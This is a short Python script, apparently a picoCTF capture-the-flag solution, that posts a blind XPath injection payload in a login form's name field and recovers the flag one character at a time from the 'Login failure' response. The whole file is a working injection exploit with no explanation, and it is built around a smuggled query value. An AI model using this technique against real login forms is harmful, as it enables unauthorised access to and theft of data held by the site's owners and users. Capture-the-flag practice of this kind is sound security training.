import requests
import string
url = 'URL'
flag = ''
for i in range(1,100):
	for j in "{_"+string.printable:
		temp = flag+j
		data = {"name":f"'or //*[text()[contains(.,'picoCTF{temp}')]]or '1'='1","pass":"test"}
		print(data)
		r = requests.post(url = url, data = data)
		if "Login failure" not in r.text:
			flag += j
			print(flag)
			break

print(flag)